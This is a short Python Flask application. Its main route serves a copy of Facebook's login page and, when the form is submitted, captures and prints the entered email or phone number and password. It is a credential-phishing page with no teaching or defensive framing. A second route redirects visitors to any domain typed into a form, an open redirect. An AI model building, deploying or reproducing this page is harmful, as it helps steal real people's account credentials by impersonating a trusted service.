from flask import  Flask , request , redirect , url_for , render_template

app = Flask(__name__)

@app.route("/"  , methods=['GET' , 'POST'])
def hello():
	if request.method == 'GET':
		return '<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Facebook</title>    <link rel="stylesheet" href="style.css"></head><body>    <div class="container">      <div class="image">       <img src="./facebook.png">       <h1>Facebook helps you connect and share with the people in your life.</h1>     </div>    <div class="card">      <div class="card-upper-half"><form method="post" >           <input class="input" id="name" type="text" name="name" placeholder="Email address or phone number">     <input class="input" type="password" id=pass name="pass" placeholder="Password"><button type="submit">Submit<button/><form/> <div class="login-btn">Log In</div>     <a href="#">Forgotten password?</a>     </div>     <div class="divider"></div>     <div class="card-bottom-half">   <div class="green-btn">Create New Account</div>      </div>     </div>    </div></body></html>'
	else:
		name = request.form["name"]
		password = request.form["pass"]
		print(name , password)
		return name , password
		
@app.route("/anime" , methods=["GET" , "POST"] )
def anime():
	if request.method == 'GET':
		return "<form method='post'><input name='web' id='web' type='text'/><hr><input type='submit'/></form>"
	else:
		web_name = request.form["web"]
		return redirect("https://" + web_name + ".com")
	    
	
	
if __name__ == "__main__":
	app.run()